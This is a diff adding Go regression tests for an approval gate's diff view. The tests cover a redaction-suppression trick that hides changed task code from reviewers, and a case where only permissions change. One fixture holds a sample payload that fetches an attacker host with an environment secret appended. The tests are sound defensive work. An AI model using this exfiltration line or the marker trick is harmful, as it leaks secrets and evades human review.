@@ -6,6 +6,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/dicode/dicode/pkg/task"
 )
 
 // TestDiffFlagsChangedFileEvenWhenBothSidesAreCapped is the regression for a
@@ -866,5 +868,90 @@ func TestRedactSecretsKnownGaps(t *testing.T) {
 		if !strings.Contains(redactSecrets(in), "sk-live-") {
 			t.Errorf("%s is now redacted — good; remove it from the known-gap list", name)
 		}
+	}
+}
+
+// TestDiffSuppressionAttack is the regression for the redaction-suppression
+// attack: a block-scalar marker planted at column 0 in any snapshotted file
+// makes redactValueLines swallow everything indented below it, so two
+// entirely different versions scrub to identical text. Deciding changed-vs-
+// unchanged on redacted text let that file drop out of Files permanently
+// while the content hash still pended the task — a self-installed blind spot.
+func TestDiffSuppressionAttack(t *testing.T) {
+	g, _, _ := newTestGate(t, enabledPolicy())
+	benign := "const _d = `\nvalue: |\n  `;\n  export default async () => { /* benign */ };\n"
+	spec := writeTaskDir(t, t.TempDir(), "repo/supp", benign)
+
+	if _, err := g.Admit(spec); err != nil {
+		t.Fatal(err)
+	}
+	if err := g.Approve("repo/supp"); err != nil {
+		t.Fatal(err)
+	}
+
+	evil := "const _d = `\nvalue: |\n  `;\n  export default async () => { await fetch('https://evil/'+Deno.env.get('T')); };\n"
+	if err := os.WriteFile(filepath.Join(spec.TaskDir, "task.js"), []byte(evil), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	armed, err := g.Admit(spec)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if armed {
+		t.Fatal("gate armed a changed task; the rest of this test assumes it pends")
+	}
+
+	d, err := g.Diff("repo/supp")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var js *FileDiff
+	for i := range d.Files {
+		if d.Files[i].Path == "task.js" {
+			js = &d.Files[i]
+		}
+	}
+	if js == nil {
+		t.Fatalf("task.js changed and the task is pending, but it is absent from the diff: %+v", d.Files)
+	}
+	// Its content is hidden by the attacker's own marker, so the operator
+	// must be told the change exists and cannot be shown here.
+	if !js.ContentHidden {
+		t.Error("a file whose change is entirely inside redacted content must be marked ContentHidden")
+	}
+	if !d.Incomplete || d.IncompleteReason == "" {
+		t.Error("a diff that cannot show a real change must be marked Incomplete with a reason")
+	}
+}
+
+// TestDiffIncompleteWhenOnlyOutsideTaskDir covers the taskset-override case:
+// the content hash folds in resolved permissions/trigger, which live outside
+// the task dir, so a task can pend with every file byte-identical. An empty
+// Files list must never render as "nothing changed".
+func TestDiffIncompleteWhenOnlyOutsideTaskDir(t *testing.T) {
+	g, _, _ := newTestGate(t, enabledPolicy())
+	spec := writeTaskDir(t, t.TempDir(), "repo/ovr", "export default () => {}\n")
+	if _, err := g.Admit(spec); err != nil {
+		t.Fatal(err)
+	}
+	if err := g.Approve("repo/ovr"); err != nil {
+		t.Fatal(err)
+	}
+
+	// Re-pend with the directory untouched, as a taskset override would.
+	spec2 := &task.Spec{ID: "repo/ovr", TaskDir: spec.TaskDir,
+		Permissions: task.Permissions{Net: []string{"*"}}}
+	if _, err := g.Admit(spec2); err != nil {
+		t.Fatal(err)
+	}
+	d, err := g.Diff("repo/ovr")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(d.Files) != 0 {
+		t.Fatalf("expected no file-level changes, got %+v", d.Files)
+	}
+	if !d.Incomplete || d.IncompleteReason == "" {
+		t.Fatal("a pending task with no file changes must report Incomplete with a reason, not an empty all-clear")
 	}
 }
